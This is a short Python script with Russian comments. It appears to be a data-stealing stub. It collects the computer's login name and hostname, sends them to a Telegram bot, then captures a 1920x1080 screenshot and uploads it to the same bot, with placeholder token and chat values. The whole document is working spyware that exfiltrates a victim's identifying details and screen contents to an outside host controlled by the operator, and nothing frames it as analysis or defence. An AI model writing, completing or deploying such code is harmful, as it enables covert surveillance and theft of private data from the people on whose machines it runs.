# импорт
import requests, socket, os, wmi, pyautogui

# Telegram Bot
TOKEN = "YouToken"
chat_id = "ChatID"
c = wmi.WMI()
#

# отправить данные компьютера
PCUser = '\nPC Name: ' + os.getlogin()
PCName = '\nUser: ' + socket.gethostname()
text = PCUser + PCName
url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={text}"
callMessage = requests.get(url)
#

# сделать/отправить скриншот
pyautogui.screenshot('screenshot.png',region=(0,0, 1920, 1080))
files={'photo':open('screenshot.png','rb')}
resp = requests.post('https://api.telegram.org/botYouToken/sendPhoto?chat_id=ChatID', files=files)
#